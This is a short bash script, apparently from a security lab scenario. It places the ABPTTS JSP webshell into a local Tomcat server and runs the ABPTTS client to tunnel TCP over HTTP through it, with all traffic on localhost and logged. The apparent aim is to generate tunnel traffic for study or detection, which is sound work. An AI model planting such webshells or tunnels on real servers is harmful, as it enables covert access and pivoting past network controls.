#!/bin/bash
# ABPTTS scenario: original Python 2 client tunneling TCP over HTTP through
# the generated JSP webshell (patched only for Java 11 Base64 API). The
# client forwards 127.0.0.1:28443 -> 127.0.0.1:9090 (PHP page).
set +e
OUT="${OUT:-/lab/src/out}"
TC=/opt/tomcat
mkdir -p "$OUT" "$TC/webapps/ROOT" /var/www/loc
cp /lab/src/scenarios/abptts/assets/abptts.jsp "$TC/webapps/ROOT/abptts.jsp"

CATALINA_HOME="$TC" "$TC/bin/catalina.sh" start >/dev/null 2>&1
for i in $(seq 1 40); do
  curl -s -o /dev/null http://127.0.0.1:8080/abptts.jsp && break
  sleep 1
done

echo "abptts tunnel data OK" > /var/www/loc/index.html
php -S 127.0.0.1:9090 -t /var/www/loc > "$OUT/abptts_data.log" 2>&1 &
DATA=$!
sleep 1

cd /lab/src/framework/drivers/abptts
timeout 70 python2.7 abpttsclient.py \
  -c /lab/src/scenarios/abptts/assets/config.txt \
  -u http://127.0.0.1:8080/abptts.jsp \
  -f 127.0.0.1:28443/127.0.0.1:9090 > "$OUT/abptts_client.log" 2>&1 &
CLI=$!
sleep 5

for i in $(seq 1 6); do
  curl -s --max-time 5 http://127.0.0.1:28443/ >> "$OUT/abptts_tunnel.log" 2>&1
  sleep 4
done

kill "$CLI" "$DATA" 2>/dev/null
"$TC/bin/catalina.sh" stop >/dev/null 2>&1
echo "abptts scenario done" >> "$OUT/abptts.log"
exit 0
